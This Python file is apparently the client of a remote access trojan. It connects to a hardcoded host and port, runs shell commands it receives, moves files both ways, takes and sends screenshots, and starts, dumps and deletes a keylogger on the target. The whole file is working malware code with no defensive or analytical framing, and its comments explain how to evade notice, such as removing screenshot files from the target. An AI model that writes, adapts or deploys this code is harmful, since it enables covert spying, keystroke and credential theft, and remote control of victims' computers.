import socket
import json
import subprocess
import os
import pyautogui
import keylogger
import threading

def send(data):
    jsonData = json.dumps(data)
    s.send(jsonData.encode())

# In order not to overflow the default socket.recv() function
# the function recv() reads the data in chunks of 1024 bytes
# at a time and appends it to the data variable.
def recv():
    data = ''

    while True:
        try:
            data = data + s.recv(1024).decode('latin-1').rstrip()
            return json.loads(data)
        
        except ValueError:
            continue

# Download the file received from the server and store it into the file system
def downloadFileRecv(fileName):
    f = open(fileName, 'wb') # Open the file in reading bytes mode
    s.settimeout(1) # We must set the timeout in order for the client to have time to receive the data
    chunk = s.recv(1024)

    while chunk:
        f.write(chunk)

        try:
            chunk = s.recv(1024)

        except socket.timeout as e:
            break

    s.settimeout(None)
    f.close()

# Upload file to the server's fyle system
def uploadFile(fileName):
    f = open(fileName, 'rb') # Open the file on 'read bytes' mode
    s.send(f.read())

# Take a screenshot and save it
def screenshot():
    prtscr = pyautogui.screenshot()
    prtscr.save('screen.png')

def shell():
    while True:

        command = recv()

        if command == 'exit': # Exit the loop if the exit message is received 
            break

        elif command == 'help':
            pass

        elif command == 'clear':
            pass

        elif command[:3] == 'cd ': # Change to the specified directory
            os.chdir(command[3:])

        elif command[:6] == 'upload':
            downloadFileRecv(command[7:])

        elif command[:8] == 'download':
            uploadFile(command[9:])

        elif command[:10] == 'screenshot':
            screenshot() # Take screenshot
            uploadFile('screen.png') # Send screenshot file
            os.remove('screen.png') # Remove screenshot from target's file system

        elif command[:12] == 'keylog-start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start) # A new thread is initiated so the server can handle other commands while listening for keystrokes
            t.start()
            send(f"[+] Keylogger as been started on [{socket.gethostname()}]")

        elif command[:11] == 'keylog-dump':
            logs = keylog.getLog()
            send(logs)

        elif command[:11] == 'keylog-stop':
            keylog.deleteFile()
            t.join()
            send(f'''[+] The keylogger session at [{socket.gethostname()}] was ended by the host. Exit with code 0x0
            [+] Log file deleted from [{keylog.path}] on target [{socket.gethostname()}]''')

        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode('latin-1')
            send(result)

# Connection data
HOST = '192.168.1.110'
PORT = 5555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

shell()